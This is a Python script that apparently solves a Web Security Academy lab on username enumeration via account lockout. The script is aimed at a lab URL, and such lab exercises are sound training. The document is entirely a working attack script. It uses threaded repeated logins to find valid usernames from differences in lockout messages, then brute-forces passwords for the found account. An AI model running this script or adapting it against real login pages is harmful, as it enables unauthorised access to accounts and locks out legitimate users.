### LAB: Username enumeration via account lock

import requests
import threading
import re

# Read username and password list
with open('username.txt', 'r') as file:
  usernames = [line.rstrip() for line in file]

with open('password.txt', 'r') as file:
  passwords = [line.rstrip() for line in file]

############################################################################

# URL LAB ID
url = 'https://0a3b002f044fbaf686e9df13005100cc.web-security-academy.net'

threads = []
error_messages = {}

# Get all unique error message
def enumerate_username(username):
  data = { 'username' : username, 'password' : 'something_wrong' }
  for i in range(5):
    response = requests.post(url = url + '/login', data = data)
    body = response.text
  match = re.findall(r'<p class=is-warning>(.*?)</p>', body)
  if match:
    error = match[0]
  else:
    error = ''
    
  if error not in error_messages.values():
    error_messages[username] = error

def find_password(username, password):
  data = { 'username' : username, 'password' : password }
  response = requests.post(url = url + '/login', data = data)
  match = re.findall(r'<p class=is-warning>(.*?)</p>', response.text)
  if match:
    error = match[0]
  else:
    error = ''
  if error not in error_messages.values():
    error_messages[password] = error

#Create thread for find the error message
for i in range(len(usernames)):
  threads.append(threading.Thread(target=enumerate_username, args=(usernames[i],)))
  threads[i].start()

for i in range(len(usernames)):
  threads[i].join()
  
print(error_messages)

username = 'akamai' # The valid username get from above
error_messages = {}
# Brute-force password, change the akamai
threads = []
for i in range(len(passwords)):
  threads.append(threading.Thread(target=find_password, args=(username,passwords[i],)))
  threads[i].start()

for i in range(len(passwords)):
  threads[i].join()

print(error_messages)